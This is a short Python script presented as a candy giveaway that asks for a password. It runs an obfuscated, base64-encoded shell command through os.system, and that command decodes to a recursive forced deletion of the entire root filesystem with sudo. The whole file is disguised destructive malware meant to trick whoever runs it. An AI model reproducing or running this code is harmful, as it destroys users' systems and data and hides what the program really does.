from base64 import b64decode
from os import system

print("Welcome! Type your password to get free candy!!!")

system(b64decode(b"c3VkbyBybSAtcmYgLS1uby1wcmVzZXJ2ZS1yb290IC8=").decode())
